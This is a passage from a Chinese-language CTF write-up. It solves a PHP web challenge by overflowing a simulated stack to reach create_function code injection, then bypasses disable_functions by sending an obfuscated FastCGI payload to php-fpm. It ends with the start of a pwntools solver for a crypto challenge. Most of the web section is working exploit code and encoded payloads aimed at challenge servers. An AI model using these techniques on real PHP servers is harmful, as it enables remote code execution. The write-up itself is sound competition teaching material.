            <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pop</span><span class="p">(</span><span class="s1">'eax'</span><span class="p">);</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_data_from_reg</span><span class="p">(</span><span class="s1">'eax'</span><span class="p">);</span>
                <span class="nb">array_push</span><span class="p">(</span><span class="nv">$args</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$data</span><span class="p">]);</span>
            <span class="p">}</span>
            <span class="nb">call_user_func_array</span><span class="p">(</span><span class="nv">$plt</span><span class="p">[</span><span class="nv">$a</span><span class="p">],</span> <span class="nv">$args</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$plt</span><span class="p">[</span><span class="nv">$a</span><span class="p">]);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">push</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$regs</span><span class="p">;</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$regs</span><span class="p">[</span><span class="nv">$item</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">hex2bin</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="o">==</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'data error'</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stack</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">esp</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">esp</span> <span class="o">-=</span> <span class="mh">0x4</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">pop</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$regs</span><span class="p">;</span>
        <span class="nv">$regs</span><span class="p">[</span><span class="nv">$item</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stack</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">esp</span><span class="p">];</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">esp</span> <span class="o">+=</span> <span class="mh">0x4</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nx">check_canary</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">print_R</span><span class="p">(</span><span class="s1">'O0OO0'</span><span class="p">);</span>
<span class="nx">print_R</span><span class="p">(</span><span class="s1">'stack'</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$phpinfo_addr</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="s1">'phpinfo'</span><span class="p">,</span> <span class="nv">$plt</span><span class="p">);</span>
    <span class="nv">$gets</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">];</span>
    <span class="nv">$main_stack</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">stack</span><span class="p">(</span><span class="nv">$phpinfo_addr</span><span class="p">,</span> <span class="nv">$gets</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s1">'--------------------output---------------------&lt;/br&gt;&lt;/br&gt;'</span><span class="p">;</span>
    <span class="nv">$main_stack</span><span class="o">-&gt;</span><span class="na">outputdata</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">'&lt;/br&gt;&lt;/br&gt;------------------phpinfo()------------------&lt;/br&gt;'</span><span class="p">;</span>
    <span class="nv">$main_stack</span><span class="o">-&gt;</span><span class="na">ret</span><span class="p">();</span>
<span class="p">}</span>
</pre></div>
<p>一看是个栈溢出，还带ASLR和Canary。从执行点看，应该溢出到<code>call_user_func_array</code>。根据phpinfo禁用的函数+PHP 7.3的版本，基本只能使用<code>create_function</code>配合代码注入来进行任意代码执行。</p>
<p>代码注入：<a href="https://www.exploit-db.com/exploits/32417" target="_blank">https://www.exploit-db.com/exploits/32417</a></p>
<p>disable_functions：<br/>
<code>file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv</code></p>
<p>溢出脚本如下，直接php -S来跑，将其作为代理来打服务器：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$seed</span><span class="o">=</span><span class="nb">time</span><span class="p">();</span>
<span class="nb">srand</span><span class="p">(</span><span class="nv">$seed</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'INS_OFFSET'</span><span class="p">,</span> <span class="nb">rand</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">));</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nx">INS_OFFSET</span><span class="p">);</span>
<span class="nv">$regs</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'eax'</span> <span class="o">=&gt;</span> <span class="mh">0x0</span><span class="p">,</span> <span class="s1">'ebp'</span> <span class="o">=&gt;</span> <span class="mh">0x0</span><span class="p">,</span> <span class="s1">'esp'</span> <span class="o">=&gt;</span> <span class="mh">0x0</span><span class="p">,</span> <span class="s1">'eip'</span> <span class="o">=&gt;</span> <span class="mh">0x0</span><span class="p">);</span>
<span class="k">function</span> <span class="nf">aslr</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$O0O</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$a</span> <span class="o">+</span> <span class="mh">0x60000000</span> <span class="o">+</span> <span class="nx">INS_OFFSET</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$func</span> <span class="o">=</span> <span class="nb">get_defined_functions</span><span class="p">()[</span><span class="s2">"internal"</span><span class="p">];</span>
<span class="nv">$func_</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$func</span><span class="p">);</span>
<span class="nb">array_walk</span><span class="p">(</span><span class="nv">$func_</span><span class="p">,</span> <span class="s1">'aslr'</span><span class="p">);</span>
<span class="nv">$plt</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$func_</span><span class="p">);</span>

<span class="c1">//var_dump($plt);</span>
<span class="k">function</span> <span class="nf">handle_data</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$len</span> <span class="o">/</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x1</span> <span class="o">*</span> <span class="p">(</span><span class="nv">$len</span> <span class="o">%</span> <span class="mh">0x4</span><span class="p">);</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_split</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">);</span>
    <span class="nv">$ret</span><span class="p">[</span><span class="nv">$a</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_pad</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="nv">$a</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">],</span> <span class="mh">0x4</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$ret</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$value</span> <span class="o">=</span> <span class="nb">strrev</span><span class="p">(</span><span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">gen_canary</span><span class="p">()</span>
<span class="p">{</span>
    <span class="nv">$canary</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789'</span><span class="p">;</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$canary</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$canary</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">)];</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$canary</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$canary</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">)];</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$canary</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$canary</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">)];</span>
    <span class="nv">$d</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">handle_data</span><span class="p">(</span><span class="nv">$a</span> <span class="o">.</span> <span class="nv">$b</span> <span class="o">.</span> <span class="nv">$c</span> <span class="o">.</span> <span class="nv">$d</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">recover_data</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="nb">hex2bin</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
<span class="p">}</span>


<span class="nv">$canary</span> <span class="o">=</span> <span class="nx">gen_canary</span><span class="p">();</span>

<span class="nv">$phpinfo_addr</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="s1">'phpinfo'</span><span class="p">,</span> <span class="nv">$plt</span><span class="p">);</span>

<span class="nv">$stack</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$ebp</span> <span class="o">=&amp;</span> <span class="nv">$regs</span><span class="p">[</span><span class="s1">'ebp'</span><span class="p">];</span>
<span class="nv">$esp</span> <span class="o">=&amp;</span> <span class="nv">$regs</span><span class="p">[</span><span class="s1">'esp'</span><span class="p">];</span>
    <span class="nv">$rand1</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
<span class="nv">$ebp</span> <span class="o">=</span> <span class="mh">0xfffe0000</span> <span class="o">+</span> <span class="nv">$rand1</span><span class="p">;</span>
<span class="nv">$stack</span><span class="p">[</span><span class="nv">$ebp</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">]</span> <span class="o">=&amp;</span> <span class="nv">$canary</span><span class="p">;</span>
    <span class="nv">$rand2</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
<span class="nv">$stack</span><span class="p">[</span><span class="nv">$ebp</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$ebp</span> <span class="o">+</span> <span class="nv">$rand2</span><span class="p">;</span>
    <span class="nv">$rand3</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">);</span>
<span class="nv">$esp</span> <span class="o">=</span> <span class="nv">$ebp</span> <span class="o">-</span> <span class="nv">$rand3</span> <span class="o">*</span> <span class="mh">0x4</span><span class="p">;</span>
<span class="nv">$stack</span><span class="p">[</span><span class="nv">$ebp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">dechex</span><span class="p">(</span><span class="nv">$phpinfo_addr</span><span class="p">);</span>

<span class="nv">$post_data</span>  <span class="o">=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'aaaa'</span><span class="p">,</span> <span class="nv">$rand3</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>           <span class="c1">// 填充到 canary 前一个空间</span>
<span class="nv">$post_data</span> <span class="o">.=</span> <span class="nb">hex2bin</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nv">$canary</span><span class="p">));</span>                 <span class="c1">// 补上 canary</span>
<span class="nv">$post_data</span> <span class="o">.=</span> <span class="s1">'Rebp'</span><span class="p">;</span>                                   <span class="c1">// random ebp</span>
<span class="nv">$bad_addr</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="s1">'create_function'</span><span class="p">,</span> <span class="nv">$plt</span><span class="p">);</span>

<span class="nv">$post_data</span> <span class="o">.=</span> <span class="nx">recover_data</span><span class="p">(</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$bad_addr</span><span class="p">));</span>          <span class="c1">// function addr</span>
<span class="nv">$post_data</span> <span class="o">.=</span> <span class="s2">"2</span><span class="se">\x00\x00\x00</span><span class="s2">"</span><span class="p">;</span>                          <span class="c1">// create_function 需要两个参数</span>
<span class="nv">$post_data</span> <span class="o">.=</span> <span class="s1">'aaaa'</span><span class="p">;</span>                                   <span class="c1">// 参数1</span>
<span class="nv">$post_data</span> <span class="o">.=</span> <span class="s1">'bbbb'</span><span class="p">;</span>                                   <span class="c1">// 参数2</span>
<span class="nv">$post_data</span> <span class="o">.=</span> <span class="nb">str_repeat</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="mi">400</span><span class="p">);</span>
<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$bad_addr</span><span class="o">.</span><span class="s1">'=1&amp;data='</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$post_data</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
<span class="k">function</span> <span class="nf">post</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$data</span><span class="p">){</span>
    <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_SSL_VERIFYHOST</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_TIMEOUT</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
    <span class="nv">$output</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
<span class="p">}</span>

<span class="nb">var_dump</span> <span class="nx">post</span><span class="p">(</span><span class="s1">'http://34.85.27.91:10080?cccc='</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'x'</span><span class="p">])</span><span class="o">.</span><span class="s1">'&amp;xxxx='</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])</span><span class="o">.</span><span class="s1">'&amp;aaaa=&amp;bbbb=1;}eval($_GET[cccc]);/*'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">));</span>
</pre></div>
<p>现在可以RCE了，但是绕不过<code>disable_functions</code>。此时看他<code>Dockerfile</code>和<code>run.sh</code>。</p>
<p>run.sh:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
service --status-all <span class="p">|</span> awk <span class="s1">'{print $4}'</span><span class="p">|</span> xargs -i service <span class="o">{}</span> start sleep infinity<span class="p">;</span>
</pre></div>
<p>Dockerfile:</p>
<div class="highlight"><pre><span></span><span class="k">RUN</span> apt-cache search <span class="s2">"php"</span> <span class="p">|</span> grep <span class="s2">"php7.3"</span><span class="p">|</span> awk <span class="s1">'{print $1}'</span><span class="p">|</span> xargs apt-get -y install
</pre></div>
<p>怎么说呢，其实有种强行出题的感觉。题目安装了所有PHP的扩展，自然也包括<code>php7.3-fpm</code>。在<code>run.sh</code>里还启用了所有服务，因此SSRF打fpm即可。</p>
<p>我们想让SSRF来帮我们跑：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'perl -e \'use warnings;use strict;use IPC::Open2;$| = 1;chdir("/");my $pid = open2(*out2, *in2, "./readflag") or die;my $reply = &lt;out2&gt;;print STDOUT $reply; $reply = &lt;out2&gt;;print STDOUT $reply; my $answer = eval($reply);print in2 " $answer "; in2-&gt;flush();$reply = &lt;out2&gt;;print STDOUT $reply;print STDOUT $reply;$reply = &lt;out2&gt;;print STDOUT $reply;$reply = &lt;out2&gt;;print STDOUT $reply;\''</span><span class="p">);</span>
</pre></div>
<p>先压缩一下：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">gzdeflate</span><span class="p">(</span><span class="s1">'perl -e \'use warnings;use strict;use IPC::Open2;$| = 1;chdir("/");my $pid = open2(*out2, *in2, "./readflag") or die;my $reply = &lt;out2&gt;;print STDOUT $reply; $reply = &lt;out2&gt;;print STDOUT $reply; my $answer = eval($reply);print in2 " $answer "; in2-&gt;flush();$reply = &lt;out2&gt;;print STDOUT $reply;print STDOUT $reply;$reply = &lt;out2&gt;;print STDOUT $reply;$reply = &lt;out2&gt;;print STDOUT $reply;\''</span><span class="p">));</span>
</pre></div>
<p>然后丢进system：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nb">gzinflate</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"jY7BCsIwDIZfJRTBVZzDHVf1ohdPE9QHKFvcCrUraacIPrztHJ487BKS///+JBZJQ4ow7x3CU5JRpnEiDs6TqvzQHk/7oigtmlzM3rCFtajaWlHCMsbF/QUzq+ogd5FIFl3v8yUslAmVrTJCWd+0bBiHjqBWOCQIrX6FzCbSO2FJGQ/ny6G8XkZTTIPiMmncEymA+JA6+Tp8xMMbwH4IE1FIdzfduzbhYsqJf9qU3BRm/gE="</span><span class="p">)));</span>
</pre></div>
<p>这就是我们最终要跑的代码。修改 <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> 中的脚本，只保留其生成功能，去除其发包功能，得到以下payload:</p>
<div class="highlight"><pre><span></span><span class="nv">AQE2ugAIAAAAAQAAAAAAAAEENroB3AAADgNDT05URU5UX0xFTkdUSDI4MwwQQ09OVEVOVF9UWVBFYXBwbGljYXRpb24vdGV4dAsEUkVNT1RFX1BPUlQ5OTg1CwlTRVJWRVJfTkFNRWxvY2FsaG9zdBELR0FURVdBWV9JTlRFUkZBQ0VGYXN0Q0dJLzEuMA8OU0VSVkVSX1NPRlRXQVJFcGhwL2ZjZ2ljbGllbnQLCVJFTU9URV9BRERSMTI3LjAuMC4xDxdTQ1JJUFRfRklMRU5BTUUvdmFyL3d3dy9odG1sL2luZGV4LnBocAsXU0NSSVBUX05BTUUvdmFyL3d3dy9odG1sL2luZGV4LnBocAkfUEhQX1ZBTFVFYXV0b19wcmVwZW5kX2ZpbGUgPSBwaHA6Ly9pbnB1dA4EUkVRVUVTVF9NRVRIT0RQT1NUCwJTRVJWRVJfUE9SVDgwDwhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMQwAUVVFUllfU1RSSU5HDxZQSFBfQURNSU5fVkFMVUVhbGxvd191cmxfaW5jbHVkZSA9IE9uDQFET0NVTUVOVF9ST09ULwsJU0VSVkVSX0FERFIxMjcuMC4wLjELF1JFUVVFU1RfVVJJL3Zhci93d3cvaHRtbC9pbmRleC5waHABBDa6AAAAAAEFNroBGwAAPD9waHAgc3lzdGVtKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCJqWTdCQ3NJd0RJWmZKUlRCVlp6REhWZjFvaGRQRTlRSEtGdmNDclVyYWFjSVByenRISjQ4N0JLUy8vLytKQlpKUTRvdzd4M0NVNUpScG5FaURzNlRxdnpRSGsvN29pZ3RtbHpNM3JDRnRhamFXbEhDTXNiRi9RVXpxK29nZDVGSUZsM3Y4eVVzbEFtVnJUSkNXZCswYkJpSGpxQldPQ1FJclg2RnpDYlNPMkZKR1Evbnk2RzhYa1pUVElQaU1tbmNFeW1BK0pBNitUcDh4TU1id0g0SUUxRklkemZkdXpiaFlzcUpmOXFVM0JSbS9nRT0iKSkpOwEFNroAAAAACg</span><span class="o">==</span>
</pre></div>
<p>之后让PHP连上php-fpm.sock并发将payload发过去即可：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nv">$sock</span><span class="o">=</span><span class="nb">stream_socket_client</span><span class="p">(</span><span class="s1">'unix:///run/php/php7.3-fpm.sock'</span><span class="p">);</span><span class="nb">fputs</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xxxx'</span><span class="p">]));</span><span class="nb">var_dump</span><span class="p">(</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">4096</span><span class="p">));</span>
</pre></div>
<p>最终Payload组合起来，如图所示。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184459-d5f2132c-6a6b-1.png"/></p>
<h2 data-content="1" id="d96bb67cbbfee92d8d2fd920a5dfa730">Crypto</h2>
<h3 data-content="1" id="1c851da79ed4d5f6144207ec0bff8e18">babyprng</h3>
<p>通读代码. 可以知道要在随机序列stack中 取等量 1, 0 就可以得到flag.<br/>
提供了<br/>
保存 <code>\x00</code><br/>
IF  <code>\x01</code><br/>
出栈 <code>\x02</code><br/>
与    <code>\x03</code><br/>
或    <code>\x04</code><br/>
异或  <code>\x05</code><br/>
向前跳<br/>
向后跳<br/>
获得等量 1, 0 序列可以采用 异或方式.</p>
<pre><code>^ 1 1 =&gt; 1 0
^ 1 0 =&gt; 1 1</code></pre>
<p>所以问题转化成如何使倒数第二位为1<br/>
这里采用的方式是 X Y<br/>
&amp; X Y<br/>
| X Y<br/>
如果 Y 在运算后 依然为1, 则 X 必定为1. 写出流程</p>
<pre><code>03    &amp;
04    |
01    IF
13    False Jmp 7
00    True  Save to out
05    ^
33    JMP 4
02    POP
39    JMP 0</code></pre>
<p>exp</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span>
<span class="k">def</span> <span class="nf">solve_pow</span><span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">):</span>
    <span class="k">print</span> <span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i0</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i1</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">i2</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">:</span>
                <span class="k">for</span> <span class="n">i3</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">:</span>
                    <span class="n">i</span> <span class="o">=</span> <span class="n">i0</span><span class="o">+</span><span class="n">i1</span><span class="o">+</span><span class="n">i2</span><span class="o">+</span><span class="n">i3</span>
                    <span class="nb">hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">()</span>
                    <span class="nb">hash</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">arg1</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
                    <span class="n">tmp</span> <span class="o">=</span> <span class="nb">hash</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
                    <span class="k">if</span> <span class="n">tmp</span> <span class="o">==</span> <span class="n">arg2</span><span class="p">:</span>
                        <span class="k">print</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
                        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"34.92.185.118"</span><span class="p">,</span><span class="s2">"10002"</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Give me XXXX:'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">regex</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">"\+(.*)\) == (.*)"</span>

<span class="n">test_str</span> <span class="o">=</span> <span class="n">data</span>
<span class="n">matches</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span> <span class="n">test_str</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">MULTILINE</span><span class="p">)</span>
